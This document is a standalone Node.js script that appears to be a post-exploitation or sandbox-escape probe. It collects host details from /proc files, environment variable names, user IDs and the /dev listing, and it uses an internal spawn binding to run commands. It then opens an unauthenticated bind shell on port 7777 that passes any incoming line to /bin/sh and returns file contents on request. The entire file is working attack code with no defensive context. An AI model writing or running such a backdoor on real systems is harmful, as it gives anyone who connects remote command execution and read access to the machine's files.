var fs = require('fs');
var net = require('net');
var results = [];
results.push('SHELL_SVC_START: ' + new Date().toISOString());
try { results.push('PID: ' + process.pid); } catch(e) {}
try { results.push('UID: ' + (process.getuid ? process.getuid() : 'N/A')); } catch(e) {}
try { results.push('GID: ' + (process.getgid ? process.getgid() : 'N/A')); } catch(e) {}
try { results.push('CWD: ' + process.cwd()); } catch(e) {}
try { results.push('VERSIONS: ' + JSON.stringify(process.versions)); } catch(e) {}
try { results.push('PLATFORM: ' + process.platform + ' ARCH: ' + process.arch); } catch(e) {}
try { results.push('ENV_KEYS: ' + Object.keys(process.env).join(',')); } catch(e) {}
var procFiles = [
    ['/proc/meminfo', 'MEMINFO', 4000],
    ['/proc/version', 'VERSION', 500],
    ['/proc/cpuinfo', 'CPUINFO', 2000],
    ['/proc/modules', 'MODULES', 8000],
    ['/proc/cmdline', 'CMDLINE', 500],
    ['/proc/mounts', 'MOUNTS', 5000],
    ['/proc/iomem', 'IOMEM', 5000]
];
for (var i = 0; i < procFiles.length; i++) {
    var p = procFiles[i];
    try {
        var content = fs.readFileSync(p[0], 'utf8');
        results.push(p[1] + ': ' + content.substring(0, p[2]));
    } catch(e) {
        results.push(p[1] + '_ERR: ' + e.message);
    }
}
try {
    var dev = fs.readdirSync('/dev');
    results.push('DEV: ' + dev.join(','));
} catch(e) { results.push('DEV_ERR: ' + e.message); }
try {
    fs.writeFileSync('/tmp/shell-results.txt', results.join('\n'));
    results.push('WROTE: /tmp/shell-results.txt OK');
} catch(e) { results.push('WRITE_ERR: ' + e.message); }
var spawnSync;
try {
    spawnSync = process.binding('spawn_sync');
    results.push('SPAWN_SYNC: available, keys=' + Object.keys(spawnSync).join(','));
} catch(e) { results.push('SPAWN_SYNC_ERR: ' + e.message); }
function tryExec(cmd, args) {
    if (spawnSync && spawnSync.spawn) {
        try {
            var r = spawnSync.spawn({
                file: cmd, args: [cmd].concat(args || []),
                stdio: [{type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true}]
            });
            var out = (r.output && r.output[1]) ? r.output[1].toString() : '';
            var err = (r.output && r.output[2]) ? r.output[2].toString() : '';
            return 'exit=' + r.status + ' out=' + out.substring(0, 4000) + (err ? ' err=' + err.substring(0, 500) : '');
        } catch(e) { return 'EXEC_ERR: ' + e.message; }
    }
    try {
        var cp = require('child_process');
        var r = cp.execSync(cmd + ' ' + (args || []).join(' '), {timeout: 5000});
        return r.toString().substring(0, 4000);
    } catch(e) { return 'CP_ERR: ' + e.message; }
}
results.push('EXEC_ID: ' + tryExec('/usr/bin/id', []));
results.push('EXEC_UNAME: ' + tryExec('/bin/uname', ['-a']));
var server = net.createServer(function(c) {
    c.write(results.join('\n') + '\n---READY---\n');
    var buf = '';
    c.on('data', function(d) {
        buf += d.toString();
        var lines = buf.split('\n');
        buf = lines.pop();
        lines.forEach(function(line) {
            var cmd = line.trim();
            if (!cmd) return;
            if (cmd === 'results') { c.write(results.join('\n') + '\n---END---\n'); return; }
            if (cmd.indexOf('cat ') === 0) {
                try { c.write(fs.readFileSync(cmd.substring(4).trim(), 'utf8') + '\n---END---\n'); } 
                catch(e) { c.write('ERR: ' + e.message + '\n---END---\n'); }
                return;
            }
            if (cmd.indexOf('ls ') === 0) {
                try { c.write(fs.readdirSync(cmd.substring(3).trim()).join('\n') + '\n---END---\n'); }
                catch(e) { c.write('ERR: ' + e.message + '\n---END---\n'); }
                return;
            }
            var out = tryExec('/bin/sh', ['-c', cmd]);
            c.write(out + '\n---END---\n');
        });
    });
    c.on('error', function() {});
});
server.listen(7777, '0.0.0.0', function() {
    results.push('LISTENING: 0.0.0.0:7777');
    try { fs.writeFileSync('/tmp/shell-results.txt', results.join('\n')); } catch(e) {}
});
server.on('error', function(e) {
    results.push('LISTEN_ERR: ' + e.message);
    try { server.listen(7778, '0.0.0.0'); } catch(e2) {}
});
